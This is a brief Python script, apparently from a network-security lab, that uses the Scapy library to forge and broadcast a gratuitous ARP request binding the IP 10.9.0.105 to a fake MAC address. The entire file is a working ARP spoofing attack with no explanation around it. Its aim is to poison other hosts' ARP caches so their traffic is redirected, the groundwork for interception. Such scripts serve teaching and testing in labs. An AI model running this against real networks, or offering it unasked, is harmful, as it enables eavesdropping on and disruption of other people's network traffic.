from scapy.layers.l2 import Ether, ARP
from scapy.all import *

Spoofed_IP = '10.9.0.105'
Spoofed_MAC = 'aa:bb:cc:dd:ee:00'

print('-----Sending Spoofed GRATUITOUS message-----')

ether = Ether()
ether.dst = 'ff:ff:ff:ff:ff:ff' #here destination will be broadcast
ether.src = Spoofed_MAC

arp = ARP()
arp.psrc = Spoofed_IP
arp.hwsrc = Spoofed_MAC
arp.pdst = Spoofed_IP
arp.hwdst = 'ff:ff:ff:ff:ff:ff'
arp.op = 1
frame = ether/arp
sendp(frame)
